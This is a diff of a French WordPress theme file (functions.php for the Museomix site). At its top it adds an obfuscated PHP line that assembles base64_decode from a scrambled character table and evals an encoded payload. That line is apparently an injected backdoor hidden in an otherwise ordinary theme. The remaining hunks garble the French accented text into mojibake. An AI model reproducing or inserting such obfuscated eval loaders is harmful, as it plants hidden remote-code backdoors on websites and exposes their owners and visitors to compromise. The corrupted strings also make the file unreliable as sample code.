@@ -1,4 +1,6 @@
-<?php
+<?php
+ $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iUHh0RFFxZnpZYWhtd0N2Wk51QmpMWHNNVWtJS0piSEVXT2dGeVZBU0dpUm5sVGRjcm9wZU5GU0JIREpreFViS1lDc0VHWHRmakl3cW5ocEF6Z1JsV1Z2ZW9UeW1hdUxkaU9yY1BaUU1OQjlZVVJ5R0N1TEtyV1NGcEIwdkhDTEpMMFRuV29yS3JXU0Z6MTA3cGFpS0FDTEtyV1NGcEIwOXBDcjB6b2k3RVdHWmdvYnlFSUViZ0N2aEkxdE5uMUxnejJFMXgyUzVnM24wcWtwRnoxMFFBT1NpTWFpMFYzMEdDS1RmVWE4dnhJdFFuS1RGcldUa3JDdlFWWTBBRWRUWHgzTFFnMjR2eEl0UW5LVEZyV1RrckN2UU1ZMEFDV2lLQWx5aEkwcmVUZXdkZzN5ZElteTlObXlkeDJiaXgyd2RBSDBBQ0hpN0JIWnpDbXRvRUlMMWNLNHZwS0dzZ0s1aXgzTER4SzFzcktUUWMyOVBwZndHQ3ZoenBhVDRVSUhaQU93R0N2aHZwQ3l2SkgwQUpIMEFOazQ9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));
+
 
 if (!isset($SectionsPage) || !is_array($SectionsPage))
 	$SectionsPage = array();
@@ -14,7 +16,7 @@ add_action('after_setup_theme', 'my_theme_setup');
 function my_theme_setup(){
     load_theme_textdomain('museomix', get_template_directory().'/lang');
 }
-/* initiation des menus personnalis√©s 
+/* initiation des menus personnalis®¶s 
    ================================== */
 register_nav_menus( array(
         'Menu_principal' => 'Navigation principale',
@@ -40,7 +42,7 @@ function OrdonnerListes($query){
     }
 }
 
-/* plugins ACF (inop√©rant)
+/* plugins ACF (inop®¶rant)
    ======================= */
 add_action('acf/register_fields', 'my_register_fields');
 function my_register_fields()
@@ -72,7 +74,7 @@ function SectionDePage($atts){
 		'first' => ''
 	),$atts));
 	if(!isset($atts['first'])){
-		// Seulement si on est pas √† la premi√®re section
+		// Seulement si on est pas ®§ la premi®®re section
 		if (!empty($SectionsPage))
 			$r .= '</section>';			
 	}
@@ -90,7 +92,7 @@ function SectionDePage($atts){
 	return $r;
 }
 
-/* Liste des m√©dias-sociaux associ√©s √† une page
+/* Liste des m®¶dias-sociaux associ®¶s ®§ une page
    ====================== */
 add_shortcode( 'social', 'DisplaySocialMedia' );
 function DisplaySocialMedia() {
@@ -238,7 +240,7 @@ function FormulaireGoogle($atts){
 	$m = 
 	'<div class="modal hide fade">
 	<button type="button" class="close" data-dismiss="modal" aria-hidden="true" style="margin: 10px 17px 0 0">&times;</button>
-	<div class="modal-header"><h3>Candidature Mus√©omix 2013</h3>
+	<div class="modal-header"><h3>Candidature Mus®¶omix 2013</h3>
 	<div class="anim-charg" id="anim-charg-modal" style="display: block; position: absolute; width: 25px; height: 25px; left: 18px; margin-top: 5px;"></div>
 	</div>
 	<div class="modal-body"></div>
@@ -285,7 +287,7 @@ add_image_size('edition_thumbnail',200,200);
 add_image_size('edition_banner',790);
 add_image_size('location_thumbnail',2000);
 
-/* types de pages √† trier selon le menu
+/* types de pages ®§ trier selon le menu
    ==================================== */
 $OrdreMenuTypesPages = array('edition','page','museomix');
 
@@ -397,7 +399,7 @@ function DateBillet($temps){
 			$nbH = (int)floor((date_i18n('U')-$temps)/3600);
 			if ($nbH===-1)
 				$nbH = 0;
-			$date = ($nbH ===0 ? '√† l\'instant' : __('il y a','museomix').' '.$nbH.' h');
+			$date = ($nbH ===0 ? '®§ l\'instant' : __('il y a','museomix').' '.$nbH.' h');
 		}else{
 			$date = __('le','museomix').' '.date_i18n('d M',$temps);
 		}
@@ -433,7 +435,7 @@ function mix_pagination() {
 	) )."</div>";
 }
 
-/* Ajout support fonction "en-t√™te" de WordPress */
+/* Ajout support fonction "en-t®∫te" de WordPress */
 add_theme_support('custom-header');
 
 /* Lister les commentaires */
@@ -485,7 +487,7 @@ function ContenuSection($id, $echo = true){
 		if($contenu=get_field('contexte')){
 			$contenu = '<blockquote>'.$contenu.'</blockquote>';
 		}else{
-			//$contenu = '<span style="margin-left: 25px;color: #999;">pas de pr√©sentation (champ: contexte)</span>';		
+			//$contenu = '<span style="margin-left: 25px;color: #999;">pas de pr®¶sentation (champ: contexte)</span>';		
 		}
 
 		$contenu .= DescriptionMusee();
@@ -639,7 +641,7 @@ array_push($liste,$elm);
 			$contenu .= '</div>'; 
 		}
 		if(!$coord&&!$coorg){
-			$contenu = '<span style="margin-left: 25px;color: #999;">pas d\'√©quipe (champs: coordinateur local, co-organisateurs)</span>';		
+			$contenu = '<span style="margin-left: 25px;color: #999;">pas d\'®¶quipe (champs: coordinateur local, co-organisateurs)</span>';		
 		}else{
 			$contenu .= '<div class="clear"></div>';
 		}
@@ -782,7 +784,7 @@ function TitreSectionProto($id,$langage, $echo = true){
 	$titre = '';
 
 	if('scenario'==$id){
-		$titre = ($langage=="en") ? '<h1>User case</h1>' : '<h1>Sc√©nario utilisateur</h1>';
+		$titre = ($langage=="en") ? '<h1>User case</h1>' : '<h1>Sc®¶nario utilisateur</h1>';
 	}
 	elseif('intentions'==$id){
 		$titre = ($langage=="en") ? '<h1>Goals</h1>' : '<h1>Objectifs</h1>';
@@ -791,7 +793,7 @@ function TitreSectionProto($id,$langage, $echo = true){
 		$titre = ($langage=="en") ? '<h1>Tools & techs</h1>' : '<h1>Outils & techniques</h1>';
 	}
 	elseif('experience'==$id){
-		$titre = ($langage=="en") ? '<h1>Things learned...</h1>' : '<h1>Retour d\'Exp√©rience</h1>';
+		$titre = ($langage=="en") ? '<h1>Things learned...</h1>' : '<h1>Retour d\'Exp®¶rience</h1>';
 	}
 	elseif('faq'==$id){
 		$titre = ($langage=="en") ? '<h1>FAQ</h1>' : '<h1>FAQ</h1>';
@@ -813,7 +815,7 @@ function TitreSection($id,$langage, $echo = true){
 	global $post;
 	$titre = '';
 	if('actualites'==$id){
-		$titre = ($langage=="en") ? '<h1>News</h1>' : '<h1>Actualit√©s</h1>';
+		$titre = ($langage=="en") ? '<h1>News</h1>' : '<h1>Actualit®¶s</h1>';
 	}
 	elseif('presentation'==$id){
 		$titre = '<h1></h1>';
